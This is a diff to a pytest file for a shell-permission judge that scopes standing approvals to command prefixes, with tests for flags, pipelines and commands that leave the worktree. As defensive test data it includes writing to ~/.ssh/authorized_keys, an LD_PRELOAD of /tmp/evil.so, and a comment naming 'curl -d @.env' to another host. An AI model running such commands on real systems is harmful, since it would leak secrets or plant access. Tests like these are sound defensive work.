@@ -31,7 +31,7 @@ from services.permissions.capability import (
     shell_capability,
 )
 from services.permissions.judge import Judgement, judge
-from services.permissions.shell_ast import command_prefix, strip_comments
+from services.permissions.shell_ast import command_prefixes, strip_comments
 
 ROOT = Path("/tmp/odysseus-judge-workspace")
 
@@ -285,27 +285,97 @@ class TestAWordThatIsAWholeCommandLine:
 
 
 class TestTheWordsACommandLeadsWith:
-    """`command_prefix` — what a standing permission could be scoped to without being
+    """`command_prefixes` — what a standing permission could be scoped to without being
     scoped to one invocation."""
 
     @pytest.mark.parametrize(
-        ("command", "prefix"),
+        ("command", "prefixes"),
         [
-            ("uv run pytest tests/test_a.py -k thing", ("uv", "run", "pytest")),
-            ("brew install ripgrep", ("brew", "install", "ripgrep")),
-            ("git commit -m 'x'", ("git", "commit")),
-            ("ls", ("ls",)),
-            ("git diff | head -20", ("git", "diff")),  # the first stage of a pipeline
+            ("uv run pytest tests/test_a.py -k thing", (("uv", "run", "pytest"),)),
+            ("brew install ripgrep", (("brew", "install", "ripgrep"),)),
+            ("git commit -m 'x'", (("git", "commit", "-m", "x"),)),
+            ("ls", (("ls",),)),
         ],
     )
-    def test_the_program_and_the_words_that_say_which_of_its_modes(self, command, prefix):
-        assert command_prefix(command) == prefix
+    def test_the_program_and_the_words_that_say_which_of_its_modes(self, command, prefixes):
+        assert command_prefixes(command) == prefixes
+
+    @pytest.mark.parametrize(
+        ("command", "prefixes"),
+        [
+            ("curl -sS https://api.example/x", (("curl", "-sS", "https://api.example/x"),)),
+            ("env -i true", (("env", "-i", "true"),)),
+            ("git --version", (("git", "--version"),)),
+            ("npm -w pkg run build", (("npm", "-w", "pkg", "run"),)),
+        ],
+    )
+    def test_a_flag_narrows_the_prefix_instead_of_ending_it(self, command, prefixes):
+        # Stopping at the first `-` read every flag-led command as its bare program name,
+        # and since a later command is read by this same walk, one yes to `curl -sS <url>`
+        # then stood for `curl -d @.env <elsewhere>` too. A flag is part of the act, so it
+        # is kept — and it costs the cap nothing, because what the cap withholds is the
+        # target, and a target is an operand.
+        assert command_prefixes(command) == prefixes
+
+    def test_the_cap_counts_operands_and_stops_the_reading(self):
+        # Three operands in, nothing more is read — not the flags either. That is what
+        # keeps `uv run pytest` a standing yes to the *act* rather than to one invocation.
+        assert command_prefixes("uv run pytest -k thing tests/a.py") == (
+            ("uv", "run", "pytest"),
+        )
+
+    @pytest.mark.parametrize(
+        ("command", "prefixes"),
+        [
+            ("git diff | head -20", (("git", "diff"), ("head", "-20"))),
+            (
+                "git add . && git commit -m x",
+                (("git", "add", "."), ("git", "commit", "-m", "x")),
+            ),
+        ],
+    )
+    def test_every_stage_answers_for_itself(self, command, prefixes):
+        # A pipeline is not one act: reading only its head would name the harmless half
+        # and leave whatever it feeds unscoped.
+        assert command_prefixes(command) == prefixes
 
     @pytest.mark.parametrize("command", ["cat $TARGET", "ls |", "$TOOL --version", ""])
     def test_a_command_that_could_not_be_read_has_no_prefix(self, command):
         # The word that names the act may be the one that could not be read, so there is
         # nothing here a permission could honestly be scoped to.
-        assert command_prefix(command) is None
+        assert command_prefixes(command) is None
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uv run pytest > ~/.ssh/authorized_keys",
+            "LD_PRELOAD=/tmp/evil.so uv run pytest",
+            "cat ../outside/x",
+        ],
+    )
+    def test_a_command_that_leaves_the_worktree_has_no_prefix(self, command):
+        # The same leading words, and not the same act: what a scope is a standing yes to
+        # is this command on a different *target*, and a target outside the worktree is
+        # where the fence stops applying.
+        assert command_prefixes(command) is None
+
+    def test_a_program_name_that_is_more_than_one_word_is_not_a_name(self):
+        # `'my prog'` is neither a path the walk can place — it read as a *relative* one,
+        # landing inside the worktree — nor a word a scope could be displayed as.
+        assert command_prefixes("'my prog' arg") is None
+
+    def test_an_empty_argument_ends_the_prefix_rather_than_joining_it(self):
+        # `git commit ""` is `git commit` with an empty target. Carrying the empty word
+        # would put a member in the scope that names nothing and displays as nothing.
+        assert command_prefixes('git commit ""') == (("git", "commit"),)
+
+    def test_every_word_of_a_prefix_survives_a_round_trip_through_display(self):
+        # Nothing else may rely on this — the scope is stored and sent as a list of words
+        # for exactly that reason — but a word carrying whitespace would mean the walk had
+        # placed something it cannot read, which is the failure this pins.
+        for command in ("uv run pytest -k x", "git commit -m 'x'", "brew install ripgrep"):
+            for prefix in command_prefixes(command) or ():
+                assert all(word and word.split() == [word] for word in prefix)
 
 
 class TestCommentsAreDropped:
